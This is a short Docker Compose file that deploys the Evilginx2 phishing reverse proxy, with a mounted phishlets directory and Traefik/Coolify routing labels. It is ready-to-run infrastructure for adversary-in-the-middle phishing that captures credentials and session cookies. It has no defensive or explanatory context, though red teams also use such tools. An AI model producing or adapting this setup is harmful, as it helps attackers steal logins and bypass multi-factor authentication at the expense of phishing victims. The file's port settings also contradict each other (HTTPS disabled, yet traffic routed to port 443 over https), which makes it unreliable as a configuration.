services:
  evilginx:
    image: warhorse/evilginx2:latest
    container_name: evilginx2        # <‑ optional friendly name
    # Run Evilginx with HTTPS disabled, HTTP on port 80
    command: >
      /bin/evilginx -p /phishlets -c /config
                   -http-port 80
                   -https-port 0
    expose:
      - "443"
    labels:
      - coolify.port=443           # already present
      - traefik.http.services.evilginx.loadbalancer.server.scheme=https
    volumes:
      - ./phishlets:/phishlets       # or named volume if you prefer
      - config_data:/config
    restart: unless-stopped
